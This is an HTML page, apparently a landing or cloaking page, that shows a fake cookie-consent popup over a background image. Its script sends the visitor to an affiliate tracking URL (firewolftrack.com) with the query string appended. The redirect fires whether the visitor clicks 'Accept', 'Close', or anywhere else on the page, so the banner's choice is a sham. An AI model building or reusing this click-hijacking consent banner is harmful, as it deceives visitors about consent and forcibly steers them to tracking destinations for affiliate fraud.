<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zenthia</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
}

/* imagem de fundo real */
.bg-img {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  object-fit: cover;
  object-position: top;
  z-index: -1;
}

/* overlay escuro */
#overlay {
  position: fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background: rgba(0,0,0,0.6);
  display:flex;
  align-items:center;
  justify-content:center;
  z-index:9999;
}

.popup {
  background: #f9fafb;
  padding: 30px 25px;
  max-width: 360px;
  width: 90%;
  border-radius: 20px;
  text-align: center;
}

.buttons {
  margin-top: 20px;
  display:flex;
  gap:10px;
  justify-content:center;
}

button {
  padding: 12px 20px;
  border-radius: 12px;
  cursor: pointer;
  border: none;
}

.accept {
  background: #5bbfa1;
  color: white;
}

.close {
  background: transparent;
  border: 2px solid #ccc;
}
</style>
</head>

<body>

<!-- fundo -->
<img src="fundo.png" class="bg-img">

<div id="overlay">
  <div class="popup">
    <h2>Cookie Policy</h2>
    <p>
      This website uses cookies to enhance your browsing experience and provide personalized services.
    </p>

    <div class="buttons">
      <button class="accept">Accept</button>
      <button class="close">Close</button>
    </div>
  </div>
</div>

<script>
function getAffiliateUrl(baseUrl) {
  return baseUrl + window.location.search;
}

document.addEventListener("DOMContentLoaded", () => {
  const baseUrl = "https://www.firewolftrack.com/2ZWCMC65/224RLGXW/";
  let clicked = false;

  function redirect() {
    if (clicked) return;
    clicked = true;
    window.location.href = getAffiliateUrl(baseUrl);
  }

  document.body.addEventListener("click", redirect);
  document.querySelector(".accept").addEventListener("click", redirect);
  document.querySelector(".close").addEventListener("click", redirect);
});
</script>

</body>
</html>
